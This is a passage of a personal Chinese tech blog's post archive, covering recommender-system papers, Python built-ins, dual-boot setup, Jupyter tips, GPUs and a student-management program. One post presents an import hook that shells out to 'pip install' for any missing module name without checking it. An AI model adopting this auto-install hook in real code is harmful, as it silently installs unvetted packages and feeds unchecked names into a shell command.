然后还有的一些书籍如《推荐系统与深度学习》和《推荐系统-技术、评估及高效算法》，大家感兴趣的话也可以进行阅读。 3、第三阶段 - 精读推荐系统经典论文，掌握诀窍在理解基本的推荐知识之后，你大概会了解到推荐具体是做什么的，那么其问题又可以分成几个方面。如召回、CTR预估、Learning to Rank等等。这个时候我建议的话就是开始阅读经典论文了。下面整理一些我看过的比较经典的论文吧，可能有遗漏，也欢迎大家补充。 FM：《Factorization Machines》 FFM：《Field-aware Factorization Machines for CTR Prediction》 DeepFM：《DeepFM: A Factorization-Machine based Neural Network for CTR Prediction》 Wide &amp; Deep：《Wide &amp; Deep Learning for Recommender Systems》 DCN：《Deep &amp; Cross Network for Ad Click Predictions》 NFM：《Neural Factorization Machines for Sparse Predictive Analytics》 AFM：《Attentional Factorization Machines:Learning the Weight of Feature Interactions via Attention Networks》 GBDT + LR：《Practical Lessons from Predicting Clicks on Ads at Facebook》 MLR：《Learning Piece-wise Linear Models from Large Scale Data for Ad Click Prediction》 DIN：《Deep Interest Network for Click-Through Rate Prediction》 DIEN：《Deep Interest Evolution Network for Click-Through Rate Prediction》 BPR：《BPR: Bayesian Personalized Ranking from Implicit Feedback》 Youtube：《Deep Neural Networks for YouTube Recommendations》 当然有些其他的论文也十分经典，咱们放在后面继续讲。 读论文也是需要一定的技巧，不同的人可能关注的点不一样，所以导致阅读重心不一样。对于我来说，我比较关注的点是这个论文要解决什么样的问题，是如何解决的，以及作者从哪几方面出发，使用什么评价指标来评判模型的好坏。至于效果，论文嘛，可信可不信，看看就好了。 4、第四阶段 - 复现推荐论文开源代码，加深理解读论文中你也许会有很多疑惑，如DeepFM这个Embedding如何共享的？DIN里面的Attention如何实现？解决这些疑惑的最好办法我认为不是读论文、百度别人写的博客，最好的方法就是去找开源的代码，试着复现也好，比着代码自己实现一遍也好，对你加深认识都有很大的帮助！ 有一些开源的代码我已经帮大家整理的差不多了，在下面的github中（以后不要再问我数据或者地址的问题了，数据都在github的readme中）：https://github.com/princewen/tensorflow_practice 不管对一篇论文你看懂了还是没看懂也好，都去尝试复现一遍吧，真的很有帮助。 5、第五阶段 - 持续跟进最近推荐论文，思维发散在不断跟进推荐系统论文的过程中，你会发现推荐系统会借鉴各个领域的方法， 持续跟进最近推荐论文，对我们学习其他领域如NLP、图像领域、强化学习等等都会有所帮助。接下来列举一些借鉴其他领域方法的一些文章吧，也算是对第三部分的一个补充。 强化学习 《DRN: A Deep Reinforcement Learning Framework for News Recommendation》 《Deep Reinforcement Learning for List-wise Recommendations》 多任务学习 《Entire Space Multi-Task Model: An Effective Approach for Estimating Post-Click Conversion Rate》 《Why I like it: Multi-task Learning for Recommendation and Explanation》 GAN 《IRGAN: A Minimax Game for Unifying Generative and Discriminative Information Retrieval Models》 《CFGAN: A Generic Collaborative Filtering Framework based on Generative Adversarial Networks》 知识图谱 《DKN: Deep Knowledge-Aware Network for News Recommendation》 《RippleNet: Propagating User Preferences on the Knowledge Graph for Recommender Systems》 《Multi-task Learning for KG enhanced Recommendation》 《Perceive Your Users in Depth: Learning Universal User Representations from Multiple E-commerce Tasks》 Transformer 《Next Item Recommendation with Self-Attention》 《Deep Session Interest Network for Click-Through Rate Prediction》 《Behavior Sequence Transformer for E-commerce Recommendation in Alibaba》 《BERT4Rec: Sequential Recommendation with Bidirectional Encoder Representations from Transformer》 RNN &amp; GNN 《SESSION-BASED RECOMMENDATIONS WITH RECURRENT NEURAL NETWORKS》 《Improved Recurrent Neural Networks for Session-based Recommendations》 《Session-based Recommendation with Graph Neural Networks》 Embedding技巧 《Real-time Personalization using Embeddings for Search Ranking at Airbnb》 《Learning and Transferring IDs Representation in E-commerce》 《Billion-scale Commodity Embedding for E-commerce Recommendation in Alibaba》 福粒: 论文下载 微信搜索：小小挖掘机","link":"/2019/11/05/转-推荐系统入门经验/"},{"title":"python 63个内置函数","text":"1 abs() 绝对值或复数的模 12In [1]: abs(-6)Out[1]: 6 2 all() 接受一个迭代器，如果迭代器的所有元素都为真，那么返回True，否则返回False 12345In [2]: all([1,0,3,6])Out[2]: FalseIn [3]: all([1,2,3])Out[3]: True 3 any() 接受一个迭代器，如果迭代器里有一个元素为真，那么返回True，否则返回False 12345In [4]: any([0,0,0,[]])Out[4]: FalseIn [5]: any([0,0,1])Out[5]: True 4 ascii() 调用对象的repr() 方法，获得该方法的返回值 123456789101112In [30]: class Student(): ...: def __init__(self,id,name): ...: self.id = id ...: self.name = name ...: def __repr__(self): ...: return 'id = '+self.id +', name = '+self.nameIn [33]: print(xiaoming)id = 001, name = xiaomingIn [34]: ascii(xiaoming)Out[34]: 'id = 001, name = xiaoming' 5 bin() 将十进制转换为二进制 12In [35]: bin(10)Out[35]: '0b1010' 6 oct() 将十进制转换为八进制 12In [36]: oct(9)Out[36]: '0o11' 7 hex() 将十进制转换为十六进制 12In [37]: hex(15)Out[37]: '0xf' 8 bool() 测试一个对象是True, 还是False. 12345678In [38]: bool([0,0,0])Out[38]: TrueIn [39]: bool([])Out[39]: FalseIn [40]: bool([1,0,1])Out[40]: True 9 bytes() 将一个字符串转换成字节类型 1234In [44]: s = \"apple\"In [45]: bytes(s,encoding='utf-8')Out[45]: b'apple' 10 str() 将字符类型、数值类型等转换为字符串类型 1234In [46]: integ = 100In [47]: str(integ)Out[47]: '100' 11 callable() 判断对象是否可以被调用，能被调用的对象就是一个callable 对象，比如函数 str, int 等都是可被调用的，但是例子4 中xiaoming这个实例是不可被调用的： 1234567891011In [48]: callable(str)Out[48]: TrueIn [49]: callable(int)Out[49]: TrueIn [50]: xiaomingOut[50]: id = 001, name = xiaomingIn [51]: callable(xiaoming)Out[51]: False 12 chr() 查看十进制整数对应的ASCII字符 12In [54]: chr(65)Out[54]: 'A' 13 ord() 查看某个ascii对应的十进制数 12In [60]: ord('A')Out[60]: 65 14 classmethod() classmethod 修饰符对应的函数不需要实例化，不需要 self 参数，但第一个参数需要是表示自身类的 cls 参数，可以来调用类的属性，类的方法，实例化对象等。 123456789In [66]: class Student(): ...: def __init__(self,id,name): ...: self.id = id ...: self.name = name ...: def __repr__(self): ...: return 'id = '+self.id +', name = '+self.name ...: @classmethod ...: def f(cls): ...: print(cls) 15 complie() 将字符串编译成python 能识别或可以执行的代码，也可以将文字读成字符串再编译。 123456789In [74]: s = \"print('helloworld')\"In [75]: r = compile(s,\"&lt;string&gt;\", \"exec\")In [76]: rOut[76]: &lt;code object &lt;module&gt; at 0x0000000005DE75D0, file \"&lt;string&gt;\", line 1&gt;In [77]: exec(r)helloworld 16 complex() 创建一个复数 12In [81]: complex(1,2)Out[81]: (1+2j) 17 delattr() 删除对象的属性 1234In [87]: delattr(xiaoming,'id')In [88]: hasattr(xiaoming,'id')Out[88]: False 18 dict() 创建数据字典 1234567891011In [92]: dict()Out[92]: {}In [93]: dict(a='a',b='b')Out[93]: {'a': 'a', 'b': 'b'}In [94]: dict(zip(['a','b'],[1,2]))Out[94]: {'a': 1, 'b': 2}In [95]: dict([('a',1),('b',2)])Out[95]: {'a': 1, 'b': 2} 19 dir() 不带参数时返回当前范围内的变量，方法和定义的类型列表；带参数时返回参数的属性，方法列表。 123456789101112131415161718192021222324252627282930In [96]: dir(xiaoming)Out[96]:['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'name'] 20 divmod() 分别取商和余数 12In [97]: divmod(10,3)Out[97]: (3, 1) 21 enumerate() 返回一个可以枚举的对象，该对象的next()方法将返回一个元组。 1234567In [98]: s = [\"a\",\"b\",\"c\"] ...: for i ,v in enumerate(s,1): ...: print(i,v) ...:1 a2 b3 c 22 eval() 将字符串str 当成有效的表达式来求值并返回计算结果取出字符串中内容 1234In [99]: s = \"1 + 3 +5\" ...: eval(s) ...:Out[99]: 9 23 exec() 执行字符串或complie方法编译过的字符串，没有返回值 123456789In [74]: s = \"print('helloworld')\"In [75]: r = compile(s,\"&lt;string&gt;\", \"exec\")In [76]: rOut[76]: &lt;code object &lt;module&gt; at 0x0000000005DE75D0, file \"&lt;string&gt;\", line 1&gt;In [77]: exec(r)helloworld 24 filter() 过滤器，构造一个序列，等价于 1[ item for item in iterables if function(item)] 在函数中设定过滤条件，逐一循环迭代器中的元素，将返回值为True时的元素留下，形成一个filter类型数据。 1234In [101]: fil = filter(lambda x: x&gt;10,[1,11,2,45,7,6,13])In [102]: list(fil)Out[102]: [11, 45, 13] 25 float() 将一个字符串或整数转换为浮点数 12In [103]: float(3)Out[103]: 3.0 26 format() 格式化输出字符串，format(value, format_spec)实质上是调用了value的format(format_spec)方法。 12In [104]: print(\"i am {0},age{1}\".format(\"tom\",18))i am tom,age18 27 frozenset() 创建一个不可修改的集合。 12In [105]: frozenset([1,1,3,2,3])Out[105]: frozenset({1, 2, 3}) 28 getattr() 获取对象的属性 12In [106]: getattr(xiaoming,'name')Out[106]: 'xiaoming' 29 globals() 返回一个描述当前全局变量的字典 30 hasattr() 12345In [110]: hasattr(xiaoming,'name')Out[110]: TrueIn [111]: hasattr(xiaoming,'id')Out[111]: False 31 hash() 返回对象的哈希值 12In [112]: hash(xiaoming)Out[112]: 6139638 32 help() 返回对象的帮助文档 123456789101112131415161718In [113]: help(xiaoming)Help on Student in module __main__ object:class Student(builtins.object) | Methods defined here: | | __init__(self, id, name) | | __repr__(self) | | ---------------------------------------------------------------------- | Data descriptors defined here: | | __dict__ | dictionary for instance variables (if defined) | | __weakref__ | list of weak references to the object (if defined) 33 id() 返回对象的内存地址 12In [115]: id(xiaoming)Out[115]: 98234208 34 input() 获取用户输入内容 123In [116]: input()aaOut[116]: 'aa' 35 int() int(x, base =10) , x可能为字符串或数值，将x 转换为一个普通整数。如果参数是字符串，那么它可能包含符号和小数点。如果超出了普通整数的表示范围，一个长整数被返回。 12In [120]: int('12',16)Out[120]: 18 36 isinstance(object, classinfo) 判断object是否为类classinfo的实例，是返回true 123456789101112In [20]: class Student(): ...: ...: def __init__(self,id,name): ...: ...: self.id = id ...: ...: self.name = name ...: ...: def __repr__(self): ...: ...: return 'id = '+self.id +', name = '+self.name ...:In [21]: xiaoming = Student('001','xiaoming')In [22]: isinstance(xiaoming,Student)Out[22]: True 37 issubclass(class, classinfo) 如果class是classinfo类的子类，返回True： 123456789101112131415161718In [27]: class undergraduate(Student): ...: def studyClass(self): ...: pass ...: def attendActivity(self): ...: pass ...:In [28]: issubclass(undergraduate,Student)Out[28]: TrueIn [29]: issubclass(object,Student)Out[29]: FalseIn [30]: issubclass(Student,object)Out[30]: True如果class是classinfo元组中某个元素的子类，也会返回TrueIn [26]: issubclass(int,(int,float))Out[26]: True 38 iter(object, sentinel) 返回一个可迭代对象, sentinel可省略 123456789101112131415161718192021222324252627282930In [72]: lst = [1,3,5]In [73]: for i in iter(lst): ...: print(i) ...:135sentinel 理解为迭代对象的哨兵，一旦迭代到此元素，立即终止：In [81]: class TestIter(object): ...: def __init__(self): ...: self.l=[1,3,2,3,4,5] ...: self.i=iter(self.l) ...: def __call__(self): #定义了__call__方法的类的实例是可调用的 ...: item = next(self.i) ...: print (\"__call__ is called,which would return\",item) ...: return item ...: def __iter__(self): #支持迭代协议(即定义有__iter__()函数) ...: print (\"__iter__ is called!!\") ...: return iter(self.l) ...:In [82]: t = TestIter() ...: t1 = iter(t, 3) ...: for i in t1: ...: print(i) ...:__call__ is called,which would return 11__call__ is called,which would return 3 39 len(s) 返回对象的长度（元素个数） 1234In [83]: dic = {'a':1,'b':3}In [84]: len(dic)Out[84]: 2 40 list([iterable]) 返回可变序列类型 12In [85]: list(map(lambda x: x%2==1, [1,3,2,4,1]))Out[85]: [True, True, False, False, True] 41 map(function, iterable, …) 返回一个将 function 应用于 iterable 中每一项并输出其结果的迭代器： 12In [85]: list(map(lambda x: x%2==1, [1,3,2,4,1]))Out[85]: [True, True, False, False, True] 可以传入多个iterable对象，输出长度等于最短序列的长度： 12In [88]: list(map(lambda x,y: x%2==1 and y%2==0, [1,3,2,4,1],[3,2,1,2]))Out[88]: [False, True, False, False] 42 max(iterable,*[, key, default]) 返回最大值： 1234567891011121314In [99]: max(3,1,4,2,1)Out[99]: 4In [100]: max((),default=0)Out[100]: 0In [89]: di = {'a':3,'b1':1,'c':4}In [90]: max(di)Out[90]: 'c'In [102]: a = [{'name':'xiaoming','age':18,'gender':'male'},{'name':' ...: xiaohong','age':20,'gender':'female'}]In [104]: max(a,key=lambda x: x['age'])Out[104]: {'name': 'xiaohong', 'age': 20, 'gender': 'female'} 43 min(iterable,*[, key, default]) 返回最小值 44 memoryview(obj) 返回由给定实参创建的“内存视图”对象， Python 代码访问一个对象的内部数据，只要该对象支持 缓冲区协议 而无需进行拷贝 45 next(iterator,[, default]) 返回可迭代对象的下一个元素 123456789101112131415161718192021222324In [129]: it = iter([5,3,4,1])In [130]: next(it)Out[130]: 5In [131]: next(it)Out[131]: 3In [132]: next(it)Out[132]: 4In [133]: next(it)Out[133]: 1In [134]: next(it,0) #迭代到头，默认返回值为0Out[134]: 0In [135]: next(it)----------------------------------------------------------------------StopIteration Traceback (most recent call last)&lt;ipython-input-135-bc1ab118995a&gt; in &lt;module&gt;----&gt; 1 next(it)StopIteration: 46 object() 返回一个没有特征的新对象。object 是所有类的基类。 1234In [137]: o = object()In [138]: type(o)Out[138]: object mode取值表： 48 pow(base, exp[, mod]) base为底的exp次幂，如果mod给出，取余 12In [149]: pow(3, 2, 4)Out[149]: 1 49 print(objects) 打印对象，此函数不解释 50 class property(fget=None, fset=None, fdel=None, doc=None) 返回 property 属性，典型的用法： 123456789101112131415161718192021222324252627282930class C: def __init__(self): self._x = None def getx(self): return self._x def setx(self, value): self._x = value def delx(self): del self._x # 使用property类创建 property 属性 x = property(getx, setx, delx, \"I'm the 'x' property.\")使用python装饰器，实现与上完全一样的效果代码：class C: def __init__(self): self._x = None @property def x(self): return self._x @x.setter def x(self, value): self._x = value @x.deleter def x(self): del self._x 51 range(stop) range(start, stop[,step])生成一个不可变序列： 12345In [153]: range(11)Out[153]: range(0, 11)In [154]: range(0,11,1)Out[154]: range(0, 11) 52 reversed(seq) 返回一个反向的 iterator: 12345678910In [155]: rev = reversed([1,4,2,3,1])In [156]: for i in rev: ...: print(i) ...:13241 53 round(number[, ndigits]) 四舍五入，ndigits代表小数点后保留几位： 12In [157]: round(10.0222222, 3)Out[157]: 10.022 54 class set([iterable]) 返回一个set对象，可实现去重： 1234In [159]: a = [1,4,2,3,1]In [160]: set(a)Out[160]: {1, 2, 3, 4} 55 class slice(stop) class slice(start, stop[, step]) 返回一个表示由 range(start, stop, step) 所指定索引集的 slice对象 1234In [170]: a = [1,4,2,3,1]In [171]: a[slice(0,5,2)] #等价于a[0:5:2]Out[171]: [1, 2, 1] 56 sorted(iterable, *, key=None, reverse=False) 排序： 1234567891011In [174]: a = [1,4,2,3,1]In [175]: sorted(a,reverse=True)Out[175]: [4, 3, 2, 1, 1]In [178]: a = [{'name':'xiaoming','age':18,'gender':'male'},{'name':' ...: xiaohong','age':20,'gender':'female'}]In [180]: sorted(a,key=lambda x: x['age'],reverse=False)Out[180]:[{'name': 'xiaoming', 'age': 18, 'gender': 'male'}, {'name': 'xiaohong', 'age': 20, 'gender': 'female'}] 57 @staticmethod 将方法转换为静态方法，不做解释 58 class str(object=’’) 返回一个 str版本的 object，str 是内置字符串 class 59 sum(iterable, /, start=0) 求和： 1234567In [181]: a = [1,4,2,3,1]In [182]: sum(a)Out[182]: 11In [185]: sum(a,10) #求和的初始值为10Out[185]: 21 60 super([type[, object-or-type]]) 返回一个代理对象，它会将方法调用委托给 type 的父类或兄弟类 61 tuple([iterable]) 虽然被称为函数，但 tuple 实际上是一个不可变的序列类型 62 class type(object) class type(name, bases, dict) 传入一个参数时，返回 object 的类型： 12345In [186]: type(xiaoming)Out[186]: __main__.StudentIn [187]: type(tuple())Out[187]: tuple 63 zip(*iterables) 创建一个聚合了来自每个可迭代对象中的元素的迭代器： 123456789101112In [188]: x = [3,2,1]In [189]: y = [4,5,6]In [190]: list(zip(y,x))Out[190]: [(4, 3), (5, 2), (6, 1)]In [191]: a = range(5)In [192]: b = list('abcde')In [193]: bOut[193]: ['a', 'b', 'c', 'd', 'e']In [194]: [str(y) + str(x) for x,y in zip(a,b)]Out[194]: ['a0', 'b1', 'c2', 'd3', 'e4']","link":"/2019/11/03/python-63个内置函数/"},{"title":"手把手配置AI项目的环境(双系统)","text":"此篇文章是为了介绍如何安装双系统（win+ubuntu），对于简单的一下过程不再描述，对于关键环节做出说明介绍。 1.下载ubuntu镜像可以先进入中国linux官网：https://cn.ubuntu.com/ ，选择Ubuntu桌面系统，之后选择下载ubuntu。 可以选择两个版本，这两个版本都是比较稳定的： http://releases.ubuntu.com/18.04/ http://releases.ubuntu.com/16.04/ 2.制作启动盘建议实用USBwriter 进行制作 3.电脑磁盘分区自行百度 4.设置BIOS，U盘启动有些电脑需要设置BIOS启动，其他电脑我用过DELL等，都是直接开机长按F2,F12,F10都有，如何成功进入BIOS，百度一下自己的电脑即可。 当然如果是笔记本就是Fn+按键即可 5.开始安装Ubuntu一波傻瓜式操作 6.分区主要分以下这些： 12345swap：用作虚拟内存，这个一般和自己的物理内存一般大/：主要用来存放Linux系统文件/boot:存放linux内核，用来引导系统的，如果是Legacy启动就要设置引导，UEFI就不用设置这个（UEFI要设置EFI文件）/usr:存放用户程序，一般在/usr/bin中存放发行版提供的程序，用户自行安装的程序默认安装到/usr/local/bin中/home:存放用户文件 当初压缩的磁盘如下图所示，选中那个空闲磁盘，然后点击+号，开始分配。 ① 分配swap，选择主分区，空间起始位置，大小最好和自己物理内存一样（我的是16G分配两倍，以后可能装个内存条所以分配32G），用于交换空间 ② 设置EFI引导，选择逻辑分区，空间起始位置，用于EFI系统分区，大小设置4G即可 ③ 设置Boot引导，选择逻辑分区，空间起始位置，用于Ext4日志文件，挂载点：/boot，大小设置8G ④ 设置/，选择逻辑分区，空间起始位置，用于Ext4日志文件，挂载点：/，大小的话推荐100G. ⑤ 设置home，选择逻辑分区，空间起始位置，用于Ext4日志文件，挂载点：/home，home大一些300G ⑥ 设置usr，选择逻辑分区，空间起始位置，用于Ext4日志文件，挂载点：/usr，大小的话剩下100G。 以上分配方式，EFI需要依照前面的①步骤分配，其余②-⑥全部以home分配为例进行分配如下图类似，自行分配即可，不一样的只是分配的大小 分配好之后如下图方框所示，椭圆形为需要安装的前的最后一步设置引导器，选择设置为EFI的引导盘作为安装启动器设备，如下图所示。 等待完成就可以了。 7.设置启动引导可以实用EasyBCD 2.3软件来设置引导，参考如下：https://blog.csdn.net/u014422976/article/details/80393841 自我感觉比较麻烦并且很多时候不好用，这里推荐使用BOOT引导，即：首先进入电脑BIOS设置后，把boot的linux启动项调到windows上面即可，之后保存重启即可进入每次就有选系统的界面了。 8.一些问题的解决解决方法： Pro1：安装ubuntu的时候由于分辨率问题，导致安装界面显示不全（如图），没法继续安装https://zhidao.baidu.com/question/522177686034499645.html?word=Ubuntu 安装过程中分辨率不兼容 Pro2：最后的引导问题：https://blog.csdn.net/u014422976/article/details/80393841 Pro3：装Ubuntu老停在ubuntu界面https://zhidao.baidu.com/question/923767939677091819?g_f=11301026&amp;word= 装Ubuntu老停在ubuntu界面 Pro4：ubuntu 安装完成后重启电脑报错: BUG soft lockup 的解决办法https://blog.csdn.net/xrinosvip/article/details/80447139 Pro5: 解決搜狗输入法无法安装的问题：https://blog.csdn.net/qq_22186119/article/details/70316727 Pro6: ubuntu搜狗输入法中文无法切换英文：https://blog.csdn.net/kang_tju/article/details/54630994 Pro7：装完双系统之后,linux和windows转换最后windows下时间错乱，早了八个小时解决方案https://blog.csdn.net/qq_40197828/article/details/79334158 Pro8: Linux（Ubuntu16.04）调节屏幕亮度（亮度控制条消失的问题）：https://blog.csdn.net/kingthon/article/details/81190898","link":"/2019/11/02/手把手配置AI项目的环境-双系统/"},{"title":"python自动导入缺失的库","text":"在写 Python 项目的时候，我们可能经常会遇到导入模块失败的错误： 123ImportError: No module named 'xxx'或者ModuleNotFoundError: No module named 'xxx' 导入失败问题，通常分为两种：一种是导入自己写的模块（即以 .py 为后缀的文件），另一种是导入三方库。本文主要讨论第二种情况。 1.单个模块中缺失的库在编写代码的时候，如果我们需要使用某个三方库（如 requests），但不确定实际运行的环境是否装了它，那么可以这样： 123456try: import requestsexcept ImportError: import os os.system('pip install requests') import requests 这样写的效果是，如果找不到 requests 库，就先安装，再导入。 在某些开源项目中，我们可能还会看到如下的写法（以 json 为例）： 1234try: import simplejson as jsonexcept ImportError: import json 这样写的效果是，优先导入三方库 simplejson，如果找不到，那就使用内置的标准库 json。 这种写法的好处是不需要导入额外的库，但它有个缺点，即需要保证那两个库在使用上是兼容的，如果在标准库中找不到替代的库，那就不可行了。 如果真找不到兼容的标准库，也可以自己写一个模块（如 my_json.py），实现想要的东西，然后在 except 语句中导入它。 1234try: import simplejson as jsonexcept ImportError: import my_json as json 2.整个项目中缺失的库以上的思路是针对开发中的项目，但是它有几个不足： 1、在代码中对每个可能缺失的三方库都 pip install，并不可取； 2、某个三方库无法被标准库或自己手写的库替代，该怎么办？ 3、已成型的项目，不允许做这些修改怎么办？ 所以这里的问题是：有一个项目，想要部署到新的机器上，它涉及很多三方库，但是机器上都没有预装，该怎么办？ 对于一个合规的项目，按照约定，通常它会包含一个“requirements.txt ”文件 ，记录了该项目的所有依赖库及其所需的版本号。这是在项目发布前，使用命令pip freeze &gt; requirements.txt 生成的。 使用命令pip install -r requirements.txt （在该文件所在目录执行，或在命令中写全文件的路径），就能自动把所有的依赖库给装上。 但是，如果项目不合规，或者由于其它倒霉的原因，我们没有这样的文件，又该如何是好？ 一个笨方法就是，把项目跑起来，等它出错，遇到一个导库失败，就手动装一个，然后再跑一遍项目，遇到导库失败就装一下，如此循环……（此处省略 1 万句脏话）…… 3.自动导入任意缺失的库在不修改原有的代码的情况下，在不需要“requirements.txt”文件的情况下，有没有办法自动导入所需要的库呢？ 当然有！先看看效果： 我们以 tornado 为例，第一步操作可看出，我们没有装过 tornado，经过第二步操作后，再次导入 tornado 时，程序会帮我们自动下载并安装好 tornado，所以不再报错。 autoinstall 是我们手写的模块，代码如下： 12345678910111213141516171819202122# 以下代码在 python 3.6.1 版本验证通过import sysimport osfrom importlib import import_moduleclass AutoInstall(): _loaded = set() @classmethod def find_spec(cls, name, path, target=None): if path is None and name not in cls._loaded: cls._loaded.add(name) print(\"Installing\", name) try: result = os.system('pip install {}'.format(name)) if result == 0: return import_module(name) except Exception as e: print(\"Failed\", e) return Nonesys.meta_path.append(AutoInstall) Python 3 的 import 机制在查找过程中，大致顺序如下： 在 sys.modules 中查找，它缓存了所有已导入的模块 在 sys.meta_path 中查找，它支持自定义的加载器 在 sys.path 中查找，它记录了一些库所在的目录名 若未找到，抛出ImportError异常 其中要注意，sys.meta_path 在不同的 Python 版本中有所差异，比如它在 Python 2 与 Python 3 中差异很大；在较新的 Python 3 版本（3.4+）中，自定义的加载器需要实现find_spec方法，而早期的版本用的则是find_module。 以上代码是一个自定义的类库加载器 AutoInstall，可以实现自动导入三方库的目的。需要说明一下，这种方法会“劫持”所有新导入的库，破坏原有的导入方式，因此也可能出现一些奇奇怪怪的问题，敬请留意。 sys.meta_path 属于 Python 探针 的一种运用。探针，即import hook，是 Python 几乎不受人关注的机制，但它可以做很多事，例如加载网络上的库、在导入模块时对模块进行修改、自动安装缺失库、上传审计信息、延迟加载等等。","link":"/2019/10/30/python自动导入缺失的库/"},{"title":"jupyter拓展功能","text":"之前我曾经在我的笔记-JUpyter使用方法 中谈到多种jupyter的使用方法，但是这几天我又发现了一些新的拓展功能，所以特意总结在这篇文章里。 目录： Pandas Profiling 使用Cufflinks和Plotly绘制Pandas数据 Jupyter 中的格式编排 在 Jupyter（或 IPython）中使一个单元同时有多个输出 为 Jupyter Notebook 即时创建幻灯片 1.Pandas Profiling使用该工具只需安装和导入 Pandas Profiling 包。 本文不再详述这一工具，如欲了解更多，请阅读：https://towardsdatascience.com/exploring-your-data-with-just-1-line-of-python-4b35ce21a82d 2.使用Cufflinks和Plotly绘制Pandas数据使用python的人大多对 matplotlib 和 pandas 很熟悉。也就是说，你只需调用 .plot() 方法，即可快速绘制简单的 pd.DataFrame 或 pd.Series。 这已经很好了，不过是否可以绘制一个交互式、可缩放、可扩展的全景图呢？是时候让 Cufflinks* *出马了！（Cufflinks 基于 Plotly 做了进一步的包装。） 对于Plotly我已经发过一次教程在：Plotly教程 在环境中安装 Cufflinks，只需在终端中运行!pip install cufflinks –upgrade 即可。 其他更多的使用方法请参见文档 Cufflinks 文档：https://plot.ly/ipython-notebooks/cufflinks/ Plotly 文档：https://plot.ly/ 3.Jupyter 中的格式编排一些常用的格式： （1）蓝色、时尚： 123&lt;div class=\"alert alert-block alert-info\"&gt; This is &lt;b&gt;fancy&lt;/b&gt;!&lt;/div&gt; （2）红色、轻微慌张： 123&lt;div class=\"alert alert-block alert-danger\"&gt; This is &lt;b&gt;baaaaad&lt;/b&gt;!&lt;/div&gt; （3）绿色、平静： 123&lt;div class=\"alert alert-block alert-success\"&gt; This is &lt;b&gt;gooood&lt;/b&gt;!&lt;/div&gt; 效果： 4.在 Jupyter（或 IPython）中使一个单元同时有多个输出想展示 pandas DataFrame 的 .head() 和 .tail()，但由于创建运行 .tail() 方法的额外代码单元过于麻烦而不得不中途放弃，你是否有过这样的经历？现在不用怕了，你可以使用以下代码行展示你想展示的输出： 12from IPython.core.interactiveshell import InteractiveShellInteractiveShell.ast_node_interactivity = \"all\" 5.为 Jupyter Notebook 即时创建幻灯片使用RISE ，你可以仅通过一次按键将 Jupyter Notebook 即时转变为幻灯片。而且 notebook 仍然处于活跃状态，你可以在展示幻灯片的同时执行实时编码！ 要想使用该工具，你只需通过 conda 或 pip 安装 RISE 即可。 123conda install -c conda-forge rise或者pip install RISE 现在，你可以点击新按钮，为 notebook 创建不错的幻灯片了：","link":"/2019/10/29/jupyter拓展功能/"},{"title":"关于显卡","text":"为了便于理解，全文形象化介绍。 首先，显卡是电脑上绘制图像的东西，我们所看到的图像都是显卡一张一张“画”出来的，然后通过高速连续的播放，形成了我们看到的连贯图像。 显卡性能的关键参数（1）流处理器数量（CUDA核心） 可以理解为人类世界的“画师”。比如： 我们可以看到流处理器单元为1536units，相当于这个显卡为1536个“画师”。 此时我们可以知道，“画师”数量越多，画画的速度也就越快，也就是我们所说的游戏帧数高。 由此，显卡的性能优劣就可以对比出来，但是仅仅是比“画师”的数量是不够的，还要看画画的水平。 （2）显卡的架构 比如：老的麦克斯架构的GTX960显卡，与同级别但是采用帕斯卡架构的显卡中，后者是比前者性能要好的，由此我们看到，新架构的显卡的效率更高，性能更强。 我们平时利用显卡来跑深度学习程序的时候，对显卡架构来说并不用很关心，大部分关于显卡架构的工作，我们的CUDA库和所使用的深度学习库都帮我们处理了，我们平时用的GTX 1080ti、GTX 1080以及所有10系列的显卡，使用的是 Pascal 架构 ，而最新出来的RTX 2080、RTX 2080ti则使用的是Turning(图灵架构) ，而之前的服务器级别显卡P100则使用的是Volta架构 。 流处理器和架构是最影响显卡性能的参数。 （3）显卡的核心频率 这里我们可以理解为“画师”的画画速度。 在相同的流处理器和架构情况下，显卡的核心频率越高，显卡的性能也就越好。 但是我们也可以通过显卡超频（Over Clock，OC） ，也就是压榨“画师”多多来工作，去强行提升这个频率，但是要记住，超频有风险，折腾需谨慎。 （4）显存容量/位宽/频率 我们可以理解为“画师”做好了画，是需要空间存贮这些画 的。 显存位宽：表示小车将画从“画师”那里运送到仓库的数据大小，一般为128-bit或者64-bit。 显存频率：表示小车每秒能运输多少次。 显存容量：表示仓库的大小。 公版显卡与非公版显卡 公版显卡：显卡研发厂家（英伟达或者AMD）官方出售的显卡，以稳定著称。 非公版显卡：各大品牌厂家购买官方的显卡芯片后进行自己组装拼凑出来的显卡。 常见情况下我们所使用和购买的显卡都为非公版显卡。 N卡/A卡/买哪个？ N卡是英伟达芯片的显卡。 A卡是AMD芯片的显卡。 如今N卡与A卡在游戏上的区别并不是很大，但是很多游戏的话对N卡的优化比较好，所以买就买N卡吧。 下面给出一个显卡性能的天梯图（来自2019年）： 最后推荐购买高性能显卡中的RTX 2080ti、2080 （价格在1w左右），图灵架构，拥有深度学习超采样技术和光线追踪两大黑科技。 但是相比之下，华硕ROG GTX1060 6GB猛禽、华硕 GTX1060 6G雪豹、索泰 GTX1060 6G至尊更适合我们这种低端玩家（俗称穷鬼），其性价比是不错的。","link":"/2019/10/28/关于显卡/"},{"title":"学生信息管理系统（python语言）","text":"本程序包含main.py和gro.py两个函数可以使用python main.py 直接运行！ 主函数：main.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from gro import groimport pickle as pkdef main(): def printMenu(): print(\"=\" * 30) print(\" 学生管理系统\") # class maked print(\"1.添加学生信息\") print(\"2.删除学生信息\") print(\"3.修改学生信息\") print(\"4.查询学生信息\") print(\"5.显示所有学生信息\") print(\"6.导出外部文件\") #print(\"7.导入外部文件\") print(\"7.导出外部文件并加密\") #print(\"9.导入外部加密文件并解读\") print(\"0.退出系统\") print(\"=\" * 30) CS1 = gro() while True: # 打印提示信息 printMenu() key = input(\"请输入你要选择的操作：\") if key == '0': exit() if key == '1': # 添加学生信息 CS1.addstu_in() elif key == '2': CS1.del_itemin() # 删除学生信息 elif key == '3': CS1.modifystu() # 修改学生信息 # modifystu elif key == '4': CS1.sc_stu() # 查询学生信息 # sc_stu elif key == '5': print(\"=\" * 30) print(\"学生的信息如下：\") 